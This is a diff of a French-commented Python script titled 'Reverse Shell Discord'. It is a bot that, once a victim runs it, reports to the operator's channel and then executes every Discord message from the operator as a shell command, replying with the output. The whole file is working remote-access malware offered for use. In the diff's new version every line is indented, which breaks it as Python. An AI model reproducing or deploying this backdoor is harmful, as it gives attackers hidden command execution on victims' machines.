@@ -1,63 +1,63 @@
-# -*- coding: utf-8 -*-
+    # -*- coding: utf-8 -*-
 
-from subprocess import check_output
-import discord
-from discord.ext import commands
-
-
-# Reverse Shell Discord 
-
-ton_id = 1234567890
-ton_token = "TOKEN"
+    from subprocess import check_output
+    import discord
+    from discord.ext import commands
 
 
-# Pour être averti quand la victime éxécute le fichier
+    # Reverse Shell Discord 
 
-salon_id = 1234567890
-
-# Voulez-vous que le bot envoie un message quand il y a une erreur, ou qu'il l'ignore?
-
-ignore = False
+    ton_id = 1234567890
+    ton_token_de_bot = "TOKEN"
 
 
-# Voulez-vous qu'il ne prenne en compte que les messages venant de vous ?
+    # Pour être averti quand la victime éxécute le fichier
 
-private = True
+    salon_id = 1234567890
+
+    # Voulez-vous que le bot envoie un message quand il y a une erreur, ou qu'il l'ignore?
+
+    ignore = False
 
 
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+    # Voulez-vous qu'il ne prenne en compte que les messages venant de vous ?
 
-@bot.event
-async def on_ready():
-    for guild in bot.guilds:
-        for channel in guild.channels:
-            if channel.id == salon_id:
-                try:
-                    await channel.send("Niqué xD")
-                except:
-                    pass
+    private = True
+
+
+    bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+
+    @bot.event
+    async def on_ready():
+        for guild in bot.guilds:
+            for channel in guild.channels:
+                if channel.id == salon_id:
+                    try:
+                        await channel.send("Niqué xD")
+                    except:
+                        pass
+                    return
+
+    @bot.listen()
+    async def on_message(mess):
+        if private:
+            if mess.author.id != ton_id:
                 return
+        try:
+            output = check_output(mess.content, shell=True)
+            if output.decode("cp850") in ["", None]:
+                await mess.reply(content="Oke")
 
-@bot.listen()
-async def on_message(mess):
-    if private:
-        if mess.author.id != ton_id:
-            return
-    try:
-        output = check_output(mess.content, shell=True)
-        if output.decode("cp850") in ["", None]:
-            await mess.reply(content="Oke")
+            else:   
+                await mess.reply(content=output.decode("cp850"))
+        except:
+            if ignore == False:
+                await mess.reply(content="Erreur bg")
 
-        else:   
-            await mess.reply(content=output.decode("cp850"))
-    except:
-        if ignore == False:
-            await mess.reply(content="Erreur bg")
-
-    
+        
 
 
 
 
 
-bot.run(ton_token)
+    bot.run(ton_token_de_bot)
